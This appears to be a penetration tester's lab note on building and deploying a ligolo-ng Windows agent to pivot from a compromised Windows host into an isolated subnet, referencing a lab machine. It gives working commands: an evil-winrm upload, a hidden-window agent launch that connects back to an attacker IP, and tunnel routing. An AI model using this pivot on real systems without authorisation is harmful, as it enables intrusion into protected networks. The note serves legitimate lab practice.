# Cross-Compiling and Deploying a ligolo-ng Windows Agent

`apt`'s `ligolo-ng` package (Kali) only ships the Linux `ligolo-proxy`/
`ligolo-agent` binaries — no Windows agent build. For a real TUN-interface
network pivot *from* a Windows foothold (as opposed to Linux-to-Linux), the
agent needs to be cross-compiled from source.

## Build

Match the source tag to the installed proxy's own version — `ligolo-ng`'s
agent/proxy speak a version-specific protocol, and mismatched versions can
fail to negotiate:

```bash
dpkg -l ligolo-ng   # confirm installed version, e.g. 0.8.3-0kali1

git clone --depth 1 --branch v0.8.3 https://github.com/nicocha30/ligolo-ng.git /tmp/ligolo-build/ligolo-ng
cd /tmp/ligolo-build/ligolo-ng
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe ./cmd/agent
file agent.exe   # PE32+ executable for MS Windows, x86-64
```

## Starting the proxy — needs a real TTY

`ligolo-proxy` asks a first-run interactive question ("Enable Ligolo-ng
WebUI? (y/N)") on its own stdin. Backgrounding it directly (`nohup ... &`)
makes it die silently waiting on that prompt, with no obvious error in the
log. Run it in `tmux` (or `screen`) instead and answer the prompt
explicitly:

```bash
tmux new-session -d -s ligolo -x 220 -y 50 "cd /tmp/ligolo-run && ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -nobanner"
tmux send-keys -t ligolo "n" Enter
```

No `sudo` needed if `ligolo-proxy` carries `cap_net_admin` (`getcap
/usr/bin/ligolo-proxy`) — it creates and configures the local TUN interface
itself.

## Deploying and starting the agent from a Windows foothold

If deploying via `evil-winrm`'s `upload`, use **forward slashes** in the
remote destination path — its remote-path handling mangles backslashes in
the upload target even though Windows itself accepts either:

```
upload /tmp/ligolo-run/agent.exe C:/Windows/Temp/agent.exe
```

Launch it pointed back at the attacker's real (VPN/tun0) IP:

```powershell
$p = Start-Process -FilePath "C:\Windows\Temp\agent.exe" -ArgumentList "-connect <attacker-ip>:11601 -ignore-cert" -WindowStyle Hidden -PassThru
```

## Wiring up the tunnel

```
# on the ligolo-proxy console (tmux attach -t ligolo):
session                              # select the joined agent
interface_create --name ligolo
route_add --name ligolo --route <target-subnet>/24
tunnel_start --tun ligolo
```

Verify from the attacker box with a real routed check, not just an agent
"joined" log line — `ip addr show ligolo`, `ip route show`, and an actual
`ping`/`/dev/tcp` probe against a host on the newly-routed subnet.

## Why this is worth reaching for over a hand-rolled relay

A real TUN pivot gives genuine multi-port, multi-protocol routed access —
solving problems a single-port app-layer relay (see
[[single-port-reverse-relay-pivot-design]]) structurally can't: RPC
endpoint-mapper-based protocols (DRSUAPI, and generally anything using
`ncacn_ip_tcp` with a dynamic port), any tool that opens more than one
concurrent connection, and anything that just wasn't anticipated when the
relay was built. Building the real pivot once tends to be cheaper than a
second or third iteration on an app-layer relay.

## Seen on

- [[garfield#Root|Garfield]] — DC01 was genuinely dual-homed
  (`10.129.x.x` + an isolated `192.168.100.0/24` segment holding an RODC);
  a real ligolo-ng Windows agent replaced five generations of a hand-rolled
  relay and gave full routed access, though it turned out the box's real
  remaining blocker was a separate protocol-level issue the pivot alone
  didn't solve — see [[rodc-secret-replication-attack-chain]].
